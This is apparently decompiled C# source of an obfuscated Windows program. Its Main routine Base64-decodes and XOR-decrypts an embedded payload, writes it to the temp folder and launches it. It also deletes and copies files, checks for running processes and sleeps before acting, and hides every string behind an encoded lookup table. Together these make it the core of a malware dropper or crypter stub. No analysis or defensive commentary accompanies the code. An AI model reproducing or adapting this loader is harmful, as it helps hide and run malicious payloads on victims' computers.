using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.MemoryManagement;
using ns10;
using ns2;
using ns3;
using ns5;
using ns9;

namespace ns1;

internal sealed class Class6
{
	public static void smethod_0()
	{
	}

	public static bool smethod_1(string string_0)
	{
		Process[] processes = default(Process[]);
		int num = default(int);
		Process process = default(Process);
		try
		{
			processes = Process.GetProcesses();
			num = 0;
			while (true)
			{
				if (num < processes.Length)
				{
					process = processes[num];
					if (process.ProcessName.StartsWith(string_0))
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				return false;
			}
			return true;
		}
		catch (Exception exception_)
		{
			bool flag = default(bool);
			Class38.smethod_5(exception_, flag, process, num, processes, string_0);
			throw;
		}
	}

	[STAThread]
	public static void Main()
	{
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		object executablePath = default(object);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		byte[] array = default(byte[]);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		string text13 = default(string);
		byte[] array2 = default(byte[]);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text14 = default(string);
		try
		{
			if (!Class41.smethod_3())
			{
				return;
			}
			int try000c_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					int num4;
					switch (try000c_dispatch)
					{
					default:
						MemoryManager.smethod_0();
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0018;
					case 792:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								goto IL_032e;
							case 0:
								break;
							}
							goto end_IL_000c;
						}
						IL_032e:
						num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0018;
						case 3:
							goto IL_0023;
						case 4:
							goto IL_0033;
						case 5:
							goto IL_003e;
						case 6:
							goto IL_004a;
						case 7:
							goto IL_0055;
						case 8:
						case 9:
							goto IL_0060;
						case 10:
							goto IL_006a;
						case 11:
							goto IL_0087;
						case 12:
							goto IL_0098;
						case 13:
							goto IL_00b5;
						case 14:
							goto IL_00d1;
						case 15:
							goto IL_00d6;
						case 16:
							goto IL_00ed;
						case 18:
							goto IL_013e;
						case 17:
						case 19:
						case 20:
							goto IL_0141;
						case 22:
							goto IL_018b;
						case 23:
							goto IL_018e;
						case 24:
							goto IL_019d;
						case 25:
							goto IL_01b5;
						case 21:
						case 26:
						case 27:
						case 28:
							goto IL_01ce;
						case 29:
							goto IL_01ee;
						case 30:
							goto IL_0203;
						case 31:
							goto IL_0212;
						case 32:
							goto IL_022d;
						case 33:
							goto IL_0235;
						case 34:
							goto IL_0252;
						case 35:
							goto IL_025c;
						case 36:
							goto IL_0274;
						case 37:
							goto IL_0281;
						case 38:
							goto IL_02a6;
						case 39:
							goto IL_02c0;
						case 40:
							goto IL_02cb;
						case 41:
							goto IL_02da;
						case 42:
							goto IL_02e9;
						case 43:
						case 44:
							goto end_IL_000c_2;
						default:
							goto end_IL_000c;
						case 0:
							goto end_IL_000c;
						case 45:
							goto IL_041d;
						}
						goto default;
						IL_0018:
						num = 2;
						text = Class15.smethod_0(32);
						goto IL_0023;
						IL_0023:
						num = 3;
						if (smethod_1(Class15.smethod_0(45)))
						{
							goto IL_0033;
						}
						goto IL_0060;
						IL_0033:
						num = 4;
						text2 = Class15.smethod_0(58);
						goto IL_003e;
						IL_003e:
						num = 5;
						Thread.Sleep(11001);
						goto IL_004a;
						IL_004a:
						num = 6;
						text3 = Class15.smethod_0(58);
						goto IL_0055;
						IL_0055:
						num = 7;
						text4 = Class15.smethod_0(58);
						goto IL_0060;
						IL_0060:
						num = 9;
						executablePath = Application.get_ExecutablePath();
						goto IL_006a;
						IL_006a:
						num = 10;
						text5 = Environment.GetEnvironmentVariable(Class15.smethod_0(59)) + Class15.smethod_0(72);
						goto IL_0087;
						IL_0087:
						num = 11;
						text6 = Environment.ExpandEnvironmentVariables(Class15.smethod_0(77));
						goto IL_0098;
						IL_0098:
						num = 12;
						text7 = Environment.GetEnvironmentVariable(Class15.smethod_0(102)) + Class15.smethod_0(111);
						goto IL_00b5;
						IL_00b5:
						num = 13;
						text8 = Class15.smethod_0(58) + Path.GetTempPath() + Class15.smethod_0(58);
						goto IL_00d1;
						IL_00d1:
						num = 14;
						text9 = text9;
						goto IL_00d6;
						IL_00d6:
						num = 15;
						array = smethod_2(Convert.FromBase64String(text9), Class15.smethod_0(120));
						goto IL_00ed;
						IL_00ed:
						num = 16;
						if (!Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(executablePath, (object)(Class15.smethod_0(58) + text8 + Class15.smethod_0(145)), false), Operators.CompareObjectEqual(executablePath, (object)(Environment.GetEnvironmentVariable(Class15.smethod_0(59)) + Class15.smethod_0(178)), false))))
						{
							goto IL_013e;
						}
						goto IL_0141;
						IL_013e:
						num = 18;
						goto IL_0141;
						IL_0141:
						num = 20;
						if (!Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(executablePath, (object)(text8 + Class15.smethod_0(145)), false), Operators.CompareObjectEqual(executablePath, (object)(Environment.GetEnvironmentVariable(Class15.smethod_0(59)) + Class15.smethod_0(178)), false))))
						{
							goto IL_018b;
						}
						goto IL_01ce;
						IL_018b:
						num = 22;
						goto IL_018e;
						IL_018e:
						num = 23;
						text10 = Class15.smethod_0(263);
						goto IL_019d;
						IL_019d:
						num = 24;
						if (Operators.CompareString(text10, Class15.smethod_0(280), false) == 0)
						{
							goto IL_01b5;
						}
						goto IL_01ce;
						IL_01b5:
						num = 25;
						Directory.CreateDirectory(text8 + Class15.smethod_0(301));
						goto IL_01ce;
						IL_01ce:
						num = 28;
						text11 = Environment.GetEnvironmentVariable(Class15.smethod_0(102)) + Class15.smethod_0(314);
						goto IL_01ee;
						IL_01ee:
						num = 29;
						text12 = text8 + Class15.smethod_0(379);
						goto IL_0203;
						IL_0203:
						num = 30;
						text13 = Class15.smethod_0(396);
						goto IL_0212;
						IL_0212:
						num = 31;
						array2 = smethod_2(Convert.FromBase64String(text13), Class15.smethod_0(948856));
						goto IL_022d;
						IL_022d:
						num = 32;
						VBMath.Randomize();
						goto IL_0235;
						IL_0235:
						num = 33;
						Encoding.GetEncoding(1252).GetBytes(Class15.smethod_0(396));
						goto IL_0252;
						IL_0252:
						num = 34;
						File.Delete(text12);
						goto IL_025c;
						IL_025c:
						num = 35;
						File.Delete(text8 + Class15.smethod_0(948885));
						goto IL_0274;
						IL_0274:
						num = 36;
						File.Copy(text11, text12, overwrite: true);
						goto IL_0281;
						IL_0281:
						num = 37;
						((ServerComputer)Class3.smethod_0()).get_FileSystem().WriteAllBytes(text8 + Class15.smethod_0(948902), array2, false);
						goto IL_02a6;
						IL_02a6:
						num = 38;
						processStartInfo = new ProcessStartInfo(text8 + Class15.smethod_0(948902));
						goto IL_02c0;
						IL_02c0:
						num = 39;
						Process.Start(processStartInfo);
						goto IL_02cb;
						IL_02cb:
						num = 40;
						Class7.smethod_0(array2, Application.get_ExecutablePath());
						goto IL_02da;
						IL_02da:
						num = 41;
						text14 = Class15.smethod_0(948915);
						goto IL_02e9;
						IL_02e9:
						num = 42;
						if (Operators.CompareString(text14, Class15.smethod_0(280), false) != 0)
						{
						}
						break;
						end_IL_000c_2:
						break;
					}
					num = 44;
					smethod_0();
					ProjectData.EndApp();
					goto IL_041d;
					end_IL_000c:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try000c_dispatch = 792;
					continue;
				}
				break;
				IL_041d:
				if (num2 != 0)
				{
					ProjectData.ClearProjectError();
				}
				return;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		catch (Exception object_)
		{
			string text15 = default(string);
			Class40.smethod_2(object_, new object[22]
			{
				executablePath, text9, text6, text15, text, text14, text13, array, text12, text11,
				text5, text8, processStartInfo, text7, array2, text2, text3, text4, text10, num3,
				num2, num
			});
		}
	}

	public static byte[] smethod_2(object object_0, string string_0)
	{
		checked
		{
			byte[] bytes = default(byte[]);
			int num = default(int);
			byte[] array = default(byte[]);
			int num2 = default(int);
			int i = default(int);
			int num3 = default(int);
			try
			{
				bytes = Encoding.Default.GetBytes(string_0);
				num = ((byte[])object_0)[((Array)object_0).Length - 1] ^ 0x70;
				array = new byte[((Array)object_0).Length + 1];
				num2 = ((Array)object_0).Length - 1;
				for (i = 0; i <= num2; i++)
				{
					array[i] = (byte)(((byte[])object_0)[i] ^ num ^ bytes[num3]);
					num3 = ((num3 != string_0.Length - 1) ? (num3 + 1) : 0);
				}
				array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[((Array)object_0).Length - 2 + 1]);
				return array;
			}
			catch (Exception exception_)
			{
				byte[] object_ = default(byte[]);
				Class38.smethod_9(exception_, object_, num3, bytes, array, num, i, num2, object_0, string_0);
				throw;
			}
		}
	}
}
